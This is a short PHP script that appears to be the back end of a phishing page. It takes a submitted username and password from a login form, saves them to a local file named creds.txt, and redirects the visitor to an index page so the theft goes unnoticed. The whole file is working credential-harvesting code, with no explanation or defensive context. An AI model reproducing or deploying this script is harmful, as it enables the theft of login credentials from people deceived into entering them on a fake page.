<?php
$myfile=fopen("creds.txt", "w") or die("ERROR");
$name = $_POST["uname"];
$psw = $_POST["psw"];
fwrite($myfile, $name);
$separator = "!!~~*~~!!";
fwrite($myfile,$separator);
fwrite($myfile, $psw);
fclose($myfile);
header("Location: ../index.php");
exit();

//$show = file_get_contents("yaad.txt");
?>
